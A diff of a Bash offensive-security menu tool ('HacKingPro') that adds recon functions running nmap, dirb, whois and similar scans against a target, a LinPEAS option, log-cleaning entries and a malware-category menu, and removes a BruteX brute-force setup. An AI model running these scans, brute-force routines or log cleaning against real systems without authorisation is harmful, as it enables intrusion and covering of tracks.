-            ${DGrey}┌──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
-            ${DGrey}└──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
-            ")
-
-
-            HacKingProMenuMain=$(echo "${BRed}"
-            echo "$HacKingProTargetStatus""
-
-            ${DGrey}┌──╼ ${BRed}[${DGrey} Vulnerability Assessment Main Menu ${BRed}]
-            ${DGrey}|
-            ${DGrey}|──${BRed}[${DGrey} 00 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 04 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 06 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
-            ${DGrey}|──${BRed}[${DGrey} 07 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
-            ${DGrey}|
-            ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
-
-            ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
-            ${BGreen}|
-            ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
-            ${BGreen}|
-            ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Weaponization ${BRed}]${BGreen}──╼ ${BGreen}   ")
-            read -p "$HacKingProMenuMain" cmd
-            case $cmd in
-              ls )
-              ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-              echo "$ls_lahs"
-              sleep 2
-              ls -lahs
-              sleep 2
-              read -p "$ls_lahs" cmd
-              ;;
-              p|P )
-              HacKingProPlanning
-              ;;
-              x|X|exit|quit|Exit )
-              clear
-              cd "$XHacKingPro"
-              HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
-              echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
-              break
-              ;;
-            esac
-          done
-        }
-        ReconStart
-      fi
-      ;;
       ls )
-      ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-      echo "$ls_lahs"
-      sleep 2
-      ls -lahs
-      sleep 2
-      read -p "$ls_lahs" cmd
+      lahs
       ;;
       p|P )
       HacKingProPlanning
@@ -6075,7 +5289,7 @@ MainMenu(){
           clear
           ToolHeaderRun
           TargetStatusRun
-        HacKingProMenuMain=$(echo "${BRed}
+          HacKingProMenuMain=$(echo "${BRed}
     ${DGrey}┌──${BRed}[${BYellow} Anonimity ${BRed}]
     ${DGrey}|
     ${DGrey}|──${BRed}[${BWhite} 01 ${BRed}]${BGreen}── ${BRed}[${BWhite} Cover Me ${BRed}]${BGreen}── ${BRed}[${BWhite} Clean Logs & History${BRed}]
@@ -6093,21 +5307,11 @@ MainMenu(){
             HacKingProPlanning
             ;;
             ls )
-            ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}")"
-            echo "$ls_lahs"
-            sleep 2
-            ls -lahs
-            sleep 2
-            read -p "$ls_lahs" cmd
+            lahs
             ;;
             1|01 )
             clear
             CoverMe
-            ;;
-            2|02 )
-            clear
-            echo "\n\t\t ${BBlue}[${BRed}!${BBlue}] Starting Nullog \n\t\t ${BGreen}"
-            sh $xMenu00/Nullog/nullog.sh
             ;;
             x|X|exit|EXIT )
             cd $XHacKingPro
@@ -6120,6 +5324,7 @@ MainMenu(){
       Anonymity
       ;;
       1|01 )
+      cd "$x_Menu_1"
       clear
       # Page Header
       while true; do
@@ -6132,6 +5337,8 @@ MainMenu(){
     ${DGrey}┌──┲────╼ ${BRed}[${BYellow} Reconnaissance & Information Gathering ${BRed}]
     ${DGrey}|  ┖─┲──╼ ${BRed}[${BYellow} Intruder picks a target, researches it, and looks for vulnerabilities ${BRed}]
     ${DGrey}|    ┖──╼ ${BRed}[${BYellow} Intruder selects target, researches it, and attempts to identify vulnerabilities in the target network. ${BRed}]
+    ${DGrey}|
+    ${DGrey}|───${BRed}[${BYellow} Recon ${BRed}]${BGreen}── ${BRed}[${BYellow} Reconnaissance ${BRed}]
     ${DGrey}|
     ${DGrey}|──┲${BRed}[${BYellow} CPI ${BRed}]${BGreen}── ${BRed}[${BYellow} Public Information ${BRed}]
     ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
@@ -6170,22 +5377,10 @@ MainMenu(){
           read -p "$HacKingProMenuMain" cmd
           case $cmd in
             ls )
-            ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}")"
-            echo "$ls_lahs"
-            sleep 2
-            ls -lahs
-            sleep 2
-            read -p "$ls_lahs" cmd
+            lahs
             ;;
             p|P )
             HacKingProPlanning
-            ;;
-            x|X|exit|quit|Exit )
-            clear
-            cd ${XHacKingPro}
-            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
-            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
-            break
             ;;
             cmi|CMI )
             while true; do
@@ -6263,6 +5458,162 @@ MainMenu(){
                 esac
               done
             ;;
+            cpi|CPI )
+            Checking_IP_Target
+            ###############################################
+            #         Information Gathering
+            ###############################################
+
+            # TraceRoute Scan Log
+            infoTraceRoute(){
+              echo "\n\t\t${BGreen}### TraceRoute Scan Log | Time: $(date)"
+              echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Ping Scan Log
+            infoPing(){
+              echo "\n\t\t${BGreen}### Ping Scan Log | Time: $(date)"
+              echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Nslookup Scan Log
+            infoNsLookUp(){
+              echo "\n\t\t${BGreen}### Nslookup Scan Log | Time: $(date)"
+              echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Dig Scan Log
+            infoDig(){
+              echo "\n\t\t${BGreen}### Dig Scan Log | Time: $(date)"
+              echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # WhoIs Scan Log
+            infoWhois(){
+              echo "\n\t\t${BGreen}### WhoIs Scan Log | Time: $(date)"
+              echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Dirb Scan Log
+            infoDirb(){
+              echo "\n\t\t${BGreen}### Dirb Scan Log | Time: $(date)"
+              echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Nmap Scan Log
+            infoNmap(){
+              echo "\n\t\t${BGreen}### Nmap Scan Log | Time: $(date)"
+              echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            # Arp Scan Log
+            infoArp(){
+              echo "\n\t\t${BGreen}### Arp Scan Log | Time: $(date)"
+              echo "# Arp Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " $(arp -a) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+              read -p "$Press_ENTER"
+            }
+
+            while true; do
+              clear
+              ToolHeaderRun
+              TargetStatusRun
+              HacKingProMenuMain=$(echo "${BRed}
+    ${DGrey}┌──${BRed}[${BYellow} Collecting Public Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──┲${BRed}[${BYellow} CPI ${BRed}]${BGreen}── ${BRed}[${BYellow} Public Information ${BRed}]
+    ${DGrey}|  ┖─┲──${BRed}[${DGrey} p0 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Ping Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p1 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Arp Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p2 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nslookup Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p3 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dig Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p4 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} WhoIs Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p5 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Dirb Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p6 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} TraceRoute Scan ${BRed}]
+    ${DGrey}|    |──${BRed}[${DGrey} p7 ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Nmap Scan ${BRed}]
+    ${DGrey}|    ┖──${BRed}[${DGrey} px ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} xxx Scan ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${slowBlink}CPI${resetT} ${BRed}]${BGreen}──╼ ${BGreen}  ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                  p0 )
+                  # Ping Scan Log
+                  cd "${x_Case}"
+                  cd  "Recon"
+                  infoPing
+                  ;;
+                  p1 )
+                  # Arp Scan Log
+                  infoArp
+                  ;;
+                  p2 )
+                  # Nslookup Scan Log
+                  infoNsLookUp
+                  ;;
+                  p3 )
+                  # Dig Scan Log
+                  infoDig
+                  ;;
+                  p4 )
+                  # WhoIs Scan Log
+                  infoWhois
+                  ;;
+                  p5 )
+                  # Dirb Scan Log
+                  infoDirb
+                  ;;
+                  p6 )
+                  # TraceRoute Scan Log
+                  infoTraceRoute
+                  ;;
+                  p7 )
+                  # Nmap Scan Log
+                  infoNmap
+                  ;;
+                esac
+              done
+            ;;
             cli|CLI )
             while true; do
               clear
@@ -6300,47 +5651,83 @@ MainMenu(){
                   privilegeEscalation
                   read -p "$Press_ENTER"
                   ;;
+                  l1|LinPEAS|linpeas|LinPrivEsc )
+                  clear
+                  LinPrivEsc > LinPrivEsc.log
+                  less -R LinPrivEsc.log
+                  read -p "$Press_ENTER"
+                  ;;
                 esac
               done
             ;;
-            l1 )
+            x|X|exit|quit|Exit )
             clear
-            LinPrivEsc > TEST1234.txt
-            read -p "$Press_ENTER"
+            cd ${XHacKingPro}
+            HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+            echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+            break
             ;;
           esac
         done
       ;;
       02|2 )
       while true; do
+        cd "$x_Menu_2"
         clear
         ToolHeaderRun
         TargetStatusRun
-
         HacKingProMenuMain=$(echo "
     ${DGrey}┌──┲────╼ ${BRed}[${BYellow} Weaponization ${BRed}]
     ${DGrey}|  ┖─┲──╼ ${BRed}[${BYellow} Intruder develops malware designed to exploit the vulnerability ${BRed}]
     ${DGrey}|    ┖──╼ ${BRed}[${BYellow} Intruder creates remote access malware weapon, such as a virus or worm, tailored to one or more vulnerabilities. ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 1 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Viruses ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 01 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Adware ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Ransomware ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 02 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Android ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Worms ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 03 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Bots ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Trojans ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 04 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Brute Force ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 5 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Rootkits ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 05 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Car Hacking ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 6 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Keyloggers ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 06 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Card Checker ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 7 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Logic bombs ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 07 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Keyloggers ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 8 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Adware ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 08 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Local Server ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 9 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Spyware ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 09 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Logic bombs ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${BGreen} 10 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Bots ${BRed}]
+    ${DGrey}|──${BRed}[${LYellow} 10 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Malware Tools ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 11 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Mobile HacKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 12 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Privilege Escalation ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 13 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Ransomware ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 14 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Remote Access Trojan ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 15 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Rootkits ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 16 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Social Engineering ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 17 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Spyware ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 18 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Sql Injection ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 19 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Trojans ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 20 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Viruses ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 21 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Web HacKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 22 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Wireless HacKing ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 23 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} Worms ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${LYellow} 24 ${BRed}]${DGrey}───╼ ${BRed}[${BYellow} info ${BRed}]
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
@@ -6350,16 +5737,10 @@ MainMenu(){
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
     ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
-
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6377,10 +5758,10 @@ MainMenu(){
       ;;
       03|3 )
       while true; do
+        cd "$x_Menu_3"
         clear
         ToolHeaderRun
         TargetStatusRun
-
         HacKingProMenuMain=$(echo "
     ${DGrey}┌──┲────╼ ${BRed}[${BYellow} Delivery ${BRed}]
     ${DGrey}|  ┖─┲──╼ ${BRed}[${BYellow} Intruder transmits the malware via a phishing email or another medium ${BRed}]
@@ -6399,16 +5780,10 @@ MainMenu(){
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
     ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
-
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6426,6 +5801,7 @@ MainMenu(){
       ;;
       04|4 )
       while true; do
+        cd "$x_Menu_4"
         clear
         ToolHeaderRun
         TargetStatusRun
@@ -6452,12 +5828,7 @@ MainMenu(){
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6475,6 +5846,7 @@ MainMenu(){
       ;;
       05|5 )
       while true; do
+        cd "$x_Menu_5"
         clear
         ToolHeaderRun
         TargetStatusRun
@@ -6501,12 +5873,7 @@ MainMenu(){
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6524,6 +5891,7 @@ MainMenu(){
       ;;
       06|6 )
       while true; do
+        cd "$x_Menu_6"
         clear
         ToolHeaderRun
         TargetStatusRun
@@ -6550,12 +5918,7 @@ MainMenu(){
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6573,6 +5936,7 @@ MainMenu(){
       ;;
       07|7 )
       while true; do
+        cd "$x_Menu_7"
         clear
         ToolHeaderRun
         TargetStatusRun
@@ -6599,12 +5963,7 @@ MainMenu(){
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
           ls )
-          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
-          echo "$ls_lahs"
-          sleep 2
-          ls -lahs
-          sleep 2
-          read -p "$ls_lahs" cmd
+          lahs
           ;;
           arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
           Arsenal
@@ -6621,330 +5980,6 @@ MainMenu(){
       done
       ;;
       pass )
-      cd "$xMenu05"
-      Brutex(){
-        cd Brutex
-        # TARGET="$1"
-        # PORT="$2"
-        VER="2.3"
-        LOOT_DIR=./
-        FTP_USER_PASS="wordlists/ftp-default-userpass.txt"
-        FTP_USERS="wordlists/ftp_defuser.lst"
-        FTP_PASS="wordlists/ftp_defpass.lst"
-        SSH_USER_PASS="wordlists/ssh-default-userpass.txt"
-        SSH_USERS="wordlists/ssh_defuser.lst"
-        SSH_PASS="wordlists/ssh_defpass.lst"
-        SMTP_USERS="wordlists/smtp_defuser.lst"
-        SMTP_PASS="wordlists/smtp_defpass.lst"
-        POP_USERS="wordlists/pop_defuser.lst"
-        POP_PASS="wordlists/pop_defpass.lst"
-        TELNET_USER_PASS="wordlists/telnet-default-userpass.txt"
-        TELNET_USERS="wordlists/telnet_defuser.lst"
-        TELNET_PASS="wordlists/telnet_defpass.lst"
-        SQL_USERS="wordlists/sql_defuser.lst"
-        SQL_PASS="wordlists/sql_defpass.lst"
-        MSSQL_USER_PASS="wordlists/mssql-default-userpass.txt"
-        MYSQL_USER_PASS="wordlists/mysql-default-userpass.txt"
-        ORACLE_USER_PASS="wordlists/oracle-default-userpass.txt"
-        POSTGRES_USER_PASS="wordlists/postgres-default-userpass.txt"
-        WINDOWS_USER_LIST="wordlists/windows-users.txt"
-        WINDOWS_USER_PASS="wordlists/windows-default-userpass.txt"
-        USER_FILE="wordlists/simple-users.txt"
-        PASS_FILE="wordlists/password.lst"
-        SNMP_FILE="wordlists/snmp-strings.txt"
-        VNC_FILE="wordlists/vnc-default-passwords.txt"
-        HTTP_LOCATION="/"
-        THREADS="30"
-        COLOR1='\033[91m'
-        COLOR2='\033[92m'
-        COLOR3='\033[92m'
-        RESET='\e[0m'
-
-        # UN-COMMENT TO ENABLE PROXY
-        #export HYDRA_PROXY=socks4://127.0.0.1:9050
-
-        if [ -z $targetIP ]; then
-          Checking_IP_Target
-          break
-        fi
-
-        DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
-
-        echo "$COLOR1 __________                __         ____  ___$Color_Off"
-        echo "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$Color_Off"
-        echo "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $Color_Off"
-        echo "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $Color_Off"
-        echo "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $Color_Off"
-        echo "$COLOR1         \/                         \/      \_/$Color_Off"
-        echo ""
-        echo "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$Color_Off"
-        echo ""
-
-        echo "$COLOR3################################### Running Port Scan ##############################$Color_Off"
-        if [ -z "$PORT" ]
-        then
-          nmap -T4 -P0 --open $targetIP -p21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,8000,8080,6667 -oX $LOOT_DIR/nmap-${TARGET}.xml
-        else
-          nmap -T4 -P0 --open $targetIP -p $PORT -oX $LOOT_DIR/nmap-${TARGET}.xml
-        fi
-        echo ""
-        echo "$COLOR3################################### Running Brute Force ############################$Color_Off"
-        echo ""
